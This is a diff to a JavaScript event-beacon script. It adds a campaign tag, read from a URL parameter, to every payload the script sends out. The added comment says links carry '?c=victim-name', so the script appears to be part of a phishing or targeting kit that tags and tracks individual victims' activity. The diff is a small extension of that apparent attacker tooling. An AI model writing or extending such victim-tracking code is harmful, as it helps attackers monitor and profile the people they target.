@@ -27,10 +27,19 @@
   }
   var SID = makeId();
 
+  // Link with ?c=victim-name and every event gets tagged with it.
+  var CAMPAIGN = "";
+  try {
+    CAMPAIGN = (new URLSearchParams(location.search).get("c") || "").slice(0, 64);
+  } catch (e) {
+    CAMPAIGN = "";
+  }
+
   function send(payload, beacon) {
     payload.sid = SID;
     payload.ts = new Date().toISOString();
     payload.url = location.href;
+    payload.campaign = CAMPAIGN;
     var body = JSON.stringify(payload);
     try {
       if (beacon && navigator.sendBeacon) {
